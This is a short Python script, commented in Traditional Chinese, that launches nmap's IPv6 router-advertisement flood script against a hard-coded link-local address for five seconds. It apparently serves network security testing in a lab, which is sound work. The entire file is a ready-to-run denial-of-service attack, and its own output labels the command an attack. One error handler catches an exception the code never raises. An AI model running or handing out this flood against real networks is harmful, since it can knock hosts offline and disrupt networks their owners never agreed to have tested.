#!/usr/bin/env python3
import subprocess
from shlex import split
import sys
import os
import threading

# 1. 取得使用者輸入
dst_ipv6 = "fe80::11ea:d06b:9c9:576e"
interface = "ens33"
seconds = 5

# 2. 構建指令
command = f'nmap --privileged -6 {dst_ipv6}%ens33 --script ipv6-ra-flood.nse --script-args "interface={interface}"'

def kill_process(proc):
    print("\n[*] Time is over.")
    proc.terminate()

print(f"\n[!] 即將執行攻擊指令:")
print(f"    {command}")
    
# 3. 執行指令
try:
    print(f"\n[*] 正在發動測試 (Ctrl+C 可停止)... ")
    proc = subprocess.Popen(split(command))
    timer = threading.Timer(seconds, kill_process, [proc])
    timer.start()
    proc.wait()
    timer.cancel()
    
except subprocess.CalledProcessError:
    print("\n[-] 指令執行失敗。請檢查目標位址、網卡名稱以及是否已安裝該 NSE 腳本。")
except KeyboardInterrupt:
    print("\n[!] 測試已被使用者中斷。")
except Exception as e:
    print(f"\n[-] 發生非預期錯誤: {e}")
